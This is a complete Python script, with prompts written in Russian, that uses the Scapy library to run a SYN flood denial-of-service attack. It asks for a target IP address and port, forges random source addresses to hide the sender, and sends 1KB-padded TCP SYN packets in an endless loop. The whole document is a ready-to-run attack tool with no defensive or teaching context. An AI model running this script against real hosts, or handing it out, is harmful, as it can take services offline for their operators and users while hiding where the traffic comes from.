# -*- coding: cp1251 -*-
from scapy.all import *

target_ip = str(input('IP - адрес атакуемого хоста: '))
target_port = int(input('Номер порта атакуемого хоста: '))

#ip = IP(dst=target_ip) #without_ip_spoofing
ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip) #with_ip_spoofing

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop
send(p, loop=1, verbose=0)